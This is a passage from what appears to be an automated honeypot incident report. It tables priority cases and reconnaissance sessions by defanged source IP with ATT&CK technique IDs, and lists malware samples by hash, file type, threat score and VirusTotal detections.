| IR-006dce4b5c24 | HIGH | `176.53.159[.]196` | 2026-10-30 06:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c9de4e0f69f4 | HIGH | `211.149.143[.]207` | 2026-10-30 06:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ab12f7ebfd8b | HIGH | `211.149.143[.]207` | 2026-10-30 06:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ca0cfe425361 | HIGH | `201.17.208[.]212` | 2026-10-30 06:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c9ff3d43f929 | HIGH | `201.17.208[.]212` | 2026-10-30 06:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d08bd5dd778a | HIGH | `74.94.234[.]151` | 2026-10-30 06:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1e146aa35cbe | HIGH | `74.94.234[.]151` | 2026-10-30 06:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b62285944779 | HIGH | `78.155.152[.]231` | 2026-10-30 06:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-75eb5401eaa5 | HIGH | `78.155.152[.]231` | 2026-10-30 06:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a95a4bdad71a | HIGH | `103.211.219[.]58` | 2026-10-30 06:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c3d4989fb5f1 | HIGH | `129.121.138[.]193` | 2026-10-30 06:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e4b83274552b | HIGH | `129.121.138[.]193` | 2026-10-30 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c8cf5996e606 | HIGH | `103.211.219[.]58` | 2026-10-30 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ee5fb43a1a5 | HIGH | `129.121.124[.]39` | 2026-10-30 06:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-846f18cd21a0 | HIGH | `129.121.124[.]39` | 2026-10-30 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f2e1829830b1 | HIGH | `97.93.43[.]157` | 2026-10-30 06:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ba2be02ffa95 | HIGH | `97.93.43[.]157` | 2026-10-30 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d1597221d10b | HIGH | `43.245.98[.]60` | 2026-10-30 06:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c1a34c7c9af | HIGH | `43.245.98[.]60` | 2026-10-30 06:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d5c97bb08fc1 | HIGH | `101.100.194[.]181` | 2026-10-30 06:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 356 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **4** | 2026-10-30 10:10 | 2026-10-30 16:02 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-30 03:20 | 2026-10-30 06:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-10-30 12:27 | 2026-10-30 16:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]139` | **2** | 2026-10-30 09:57 | 2026-10-30 10:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]148` | **2** | 2026-10-30 09:43 | 2026-10-30 10:09 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]48` | **2** | 2026-10-30 12:55 | 2026-10-30 14:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-30 03:58 | 2026-10-30 04:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-10-30 06:43 | 2026-10-30 08:06 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-30 08:20 | 2026-10-30 10:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]10` | **2** | 2026-10-30 13:45 | 2026-10-30 15:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-30 15:37 | 2026-10-30 16:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-10-30 03:58 | 2026-10-30 04:22 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-10-30 11:50 | 2026-10-30 12:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.129[.]127` | 1 | 2026-10-30 11:23 | 2026-10-30 11:23 | 26s | 0 | `T1592` | 🟢 LOW |
| `103.255.200[.]90` | 1 | 2026-10-30 04:53 | 2026-10-30 04:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.177[.]73` | 1 | 2026-10-30 10:43 | 2026-10-30 10:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.1[.]7` | 1 | 2026-10-30 12:52 | 2026-10-30 12:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.186[.]96` | 1 | 2026-10-30 07:04 | 2026-10-30 07:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]117` | 1 | 2026-10-30 10:46 | 2026-10-30 10:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]130` | 1 | 2026-10-30 08:11 | 2026-10-30 08:11 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]178` | 1 | 2026-10-30 08:02 | 2026-10-30 08:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]40` | 1 | 2026-10-30 12:29 | 2026-10-30 12:29 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.231.60[.]55` | 1 | 2026-10-30 16:40 | 2026-10-30 16:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.115.52[.]181` | 1 | 2026-10-30 08:44 | 2026-10-30 08:44 | 14s | 0 | `T1592` | 🟢 LOW |
| `112.163.135[.]25` | 1 | 2026-10-30 04:15 | 2026-10-30 04:15 | 17s | 0 | `T1592` | 🟢 LOW |
| `114.66.42[.]81` | 1 | 2026-10-30 07:04 | 2026-10-30 07:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.149[.]134` | 1 | 2026-10-30 07:04 | 2026-10-30 07:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.40[.]49` | 1 | 2026-10-30 11:38 | 2026-10-30 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.187.180[.]162` | 1 | 2026-10-30 03:43 | 2026-10-30 03:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.73[.]90` | 1 | 2026-10-30 03:32 | 2026-10-30 03:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.114[.]113` | 1 | 2026-10-30 10:35 | 2026-10-30 10:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.239[.]129` | 1 | 2026-10-30 03:08 | 2026-10-30 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.119[.]108` | 1 | 2026-10-30 07:03 | 2026-10-30 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.34[.]237` | 1 | 2026-10-30 07:02 | 2026-10-30 07:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-30 04:47 | 2026-10-30 04:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.158[.]87` | 1 | 2026-10-30 07:00 | 2026-10-30 07:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.111[.]71` | 1 | 2026-10-30 10:44 | 2026-10-30 10:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.14[.]72` | 1 | 2026-10-30 03:30 | 2026-10-30 03:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.82.207[.]242` | 1 | 2026-10-30 07:24 | 2026-10-30 07:24 | 12s | 0 | `T1592` | 🟢 LOW |
| `121.204.171[.]142` | 1 | 2026-10-30 10:43 | 2026-10-30 10:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-10-30 13:53 | 2026-10-30 13:53 | 19s | 0 | `T1592` | 🟢 LOW |
| `123.180.188[.]162` | 1 | 2026-10-30 13:32 | 2026-10-30 13:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.58.210[.]106` | 1 | 2026-10-30 04:56 | 2026-10-30 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `134.185.110[.]154` | 1 | 2026-10-30 11:25 | 2026-10-30 11:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `134.33.65[.]66` | 1 | 2026-10-30 08:57 | 2026-10-30 08:57 | 10s | 0 | `T1592` | 🟢 LOW |
| `138.68.53[.]50` | 1 | 2026-10-30 04:54 | 2026-10-30 04:55 | 64s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]182` | 1 | 2026-10-30 07:05 | 2026-10-30 07:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]189` | 1 | 2026-10-30 03:13 | 2026-10-30 03:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.140[.]39` | 1 | 2026-10-30 10:47 | 2026-10-30 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.218[.]183` | 1 | 2026-10-30 11:48 | 2026-10-30 11:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.249.22[.]89` | 1 | 2026-10-30 12:46 | 2026-10-30 12:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-30 11:22 | 2026-10-30 11:23 | 55s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-30 15:36 | 2026-10-30 15:38 | 81s | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]171` | 1 | 2026-10-30 14:34 | 2026-10-30 14:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `163.125.145[.]196` | 1 | 2026-10-30 12:21 | 2026-10-30 12:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.118.22[.]82` | 1 | 2026-10-30 09:04 | 2026-10-30 09:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.234.143[.]92` | 1 | 2026-10-30 12:56 | 2026-10-30 12:56 | 4s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | 1 | 2026-10-30 13:09 | 2026-10-30 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.119[.]17` | 1 | 2026-10-30 15:26 | 2026-10-30 15:26 | 21s | 0 | `T1592` | 🟢 LOW |
| `176.122.105[.]215` | 1 | 2026-10-30 10:02 | 2026-10-30 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.39.13[.]157` | 1 | 2026-10-30 05:26 | 2026-10-30 05:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.167.207[.]234` | 1 | 2026-10-30 07:03 | 2026-10-30 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.228[.]149` | 1 | 2026-10-30 04:43 | 2026-10-30 04:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.233[.]177` | 1 | 2026-10-30 14:30 | 2026-10-30 14:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.236[.]214` | 1 | 2026-10-30 10:43 | 2026-10-30 10:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.236[.]71` | 1 | 2026-10-30 04:45 | 2026-10-30 04:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.240[.]16` | 1 | 2026-10-30 03:45 | 2026-10-30 03:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-10-30 03:18 | 2026-10-30 03:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-10-30 10:37 | 2026-10-30 10:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.93.193[.]100` | 1 | 2026-10-30 08:38 | 2026-10-30 08:39 | 87s | 0 | `T1592` | 🟢 LOW |
| `183.201.208[.]25` | 1 | 2026-10-30 07:05 | 2026-10-30 07:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]194` | 1 | 2026-10-30 04:01 | 2026-10-30 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.228.133[.]156` | 1 | 2026-10-30 09:26 | 2026-10-30 09:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]173` | 1 | 2026-10-30 09:36 | 2026-10-30 09:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.28.62[.]91` | 1 | 2026-10-30 11:26 | 2026-10-30 11:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.29.12[.]9` | 1 | 2026-10-30 15:52 | 2026-10-30 15:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.161.219[.]247` | 1 | 2026-10-30 03:37 | 2026-10-30 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.26[.]174` | 1 | 2026-10-30 04:01 | 2026-10-30 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]141` | 1 | 2026-10-30 09:44 | 2026-10-30 09:44 | 1s | 0 | `T1592` | 🟢 LOW |
| `196.170.113[.]223` | 1 | 2026-10-30 03:06 | 2026-10-30 03:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.114.166[.]14` | 1 | 2026-10-30 14:14 | 2026-10-30 14:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-10-30 05:14 | 2026-10-30 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.80.109[.]52` | 1 | 2026-10-30 09:08 | 2026-10-30 09:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.98.163[.]96` | 1 | 2026-10-30 10:40 | 2026-10-30 10:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.217.2[.]243` | 1 | 2026-10-30 13:59 | 2026-10-30 13:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.230.87[.]174` | 1 | 2026-10-30 02:56 | 2026-10-30 02:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.230.93[.]110` | 1 | 2026-10-30 03:23 | 2026-10-30 03:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]69` | 1 | 2026-10-30 04:00 | 2026-10-30 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]30` | 1 | 2026-10-30 07:02 | 2026-10-30 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.77[.]120` | 1 | 2026-10-30 10:54 | 2026-10-30 10:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.219.131[.]47` | 1 | 2026-10-30 03:26 | 2026-10-30 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.138.148[.]251` | 1 | 2026-10-30 06:14 | 2026-10-30 06:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-30 10:00 | 2026-10-30 10:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.187.231[.]181` | 1 | 2026-10-30 12:07 | 2026-10-30 12:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.210.245[.]31` | 1 | 2026-10-30 05:00 | 2026-10-30 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.63[.]160` | 1 | 2026-10-30 05:00 | 2026-10-30 05:00 | 4s | 0 | `T1592` | 🟢 LOW |
| `36.104.144[.]114` | 1 | 2026-10-30 03:27 | 2026-10-30 03:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.104.147[.]6` | 1 | 2026-10-30 07:10 | 2026-10-30 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.134.96[.]76` | 1 | 2026-10-30 10:39 | 2026-10-30 10:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.151.150[.]93` | 1 | 2026-10-30 10:47 | 2026-10-30 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.212.31[.]122` | 1 | 2026-10-30 04:16 | 2026-10-30 04:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]253` | 1 | 2026-10-30 10:42 | 2026-10-30 10:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `40.124.123[.]208` | 1 | 2026-10-30 09:21 | 2026-10-30 09:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.103.0[.]141` | 1 | 2026-10-30 14:26 | 2026-10-30 14:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.115.26[.]37` | 1 | 2026-10-30 10:14 | 2026-10-30 10:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-30 04:02 | 2026-10-30 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-30 13:02 | 2026-10-30 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-30 10:04 | 2026-10-30 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-30 04:13 | 2026-10-30 04:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]70` | 1 | 2026-10-30 06:20 | 2026-10-30 06:20 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]71` | 1 | 2026-10-30 06:20 | 2026-10-30 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]72` | 1 | 2026-10-30 06:20 | 2026-10-30 06:20 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]73` | 1 | 2026-10-30 06:20 | 2026-10-30 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]110` | 1 | 2026-10-30 16:28 | 2026-10-30 16:28 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.65.225[.]73` | 1 | 2026-10-30 03:43 | 2026-10-30 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-10-30 12:28 | 2026-10-30 12:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]179` | 1 | 2026-10-30 07:08 | 2026-10-30 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-30 07:38 | 2026-10-30 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.150.74[.]82` | 1 | 2026-10-30 04:18 | 2026-10-30 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.195.179[.]251` | 1 | 2026-10-30 15:51 | 2026-10-30 15:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-30 03:59 | 2026-10-30 03:59 | 1s | 0 | `T1592` | 🟢 LOW |
| `52.170.194[.]23` | 1 | 2026-10-30 13:46 | 2026-10-30 13:47 | 4s | 0 | `T1592` | 🟢 LOW |
| `59.6.18[.]50` | 1 | 2026-10-30 08:36 | 2026-10-30 08:36 | 17s | 0 | `T1592` | 🟢 LOW |
| `60.16.128[.]214` | 1 | 2026-10-30 10:42 | 2026-10-30 10:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.244.37[.]196` | 1 | 2026-10-30 10:21 | 2026-10-30 10:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.177.33[.]68` | 1 | 2026-10-30 11:20 | 2026-10-30 11:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.227.90[.]185` | 1 | 2026-10-30 15:54 | 2026-10-30 15:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-10-30 05:12 | 2026-10-30 05:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-30 13:48 | 2026-10-30 13:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]123` | 1 | 2026-10-30 09:32 | 2026-10-30 09:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]78` | 1 | 2026-10-30 07:31 | 2026-10-30 07:31 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]189` | 1 | 2026-10-30 05:32 | 2026-10-30 05:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]38` | 1 | 2026-10-30 13:53 | 2026-10-30 13:54 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]47` | 1 | 2026-10-30 04:38 | 2026-10-30 04:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]100` | 1 | 2026-10-30 09:32 | 2026-10-30 09:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | 1 | 2026-10-30 09:32 | 2026-10-30 09:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]227` | 1 | 2026-10-30 07:31 | 2026-10-30 07:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]79` | 1 | 2026-10-30 07:32 | 2026-10-30 07:32 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-30 10:34 | 2026-10-30 10:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.76.129[.]8` | 1 | 2026-10-30 03:13 | 2026-10-30 03:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-30 03:44 | 2026-10-30 03:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-30 14:37 | 2026-10-30 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.81.87[.]184` | 1 | 2026-10-30 13:07 | 2026-10-30 13:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-10-30 14:30 | 2026-10-30 14:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]0` | 1 | 2026-10-30 15:23 | 2026-10-30 15:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-10-30 05:05 | 2026-10-30 05:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]56` | 1 | 2026-10-30 05:06 | 2026-10-30 05:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.21.26[.]168` | 1 | 2026-10-30 03:48 | 2026-10-30 03:49 | 14s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]110` | 1 | 2026-10-30 10:00 | 2026-10-30 10:00 | 2s | 0 | `T1592` | 🟢 LOW |
| `93.152.233[.]40` | 1 | 2026-10-30 06:40 | 2026-10-30 06:40 | 5s | 0 | `T1592` | 🟢 LOW |
| `95.188.91[.]101` | 1 | 2026-10-30 10:43 | 2026-10-30 10:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.46.143[.]240` | 1 | 2026-10-30 15:24 | 2026-10-30 15:24 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
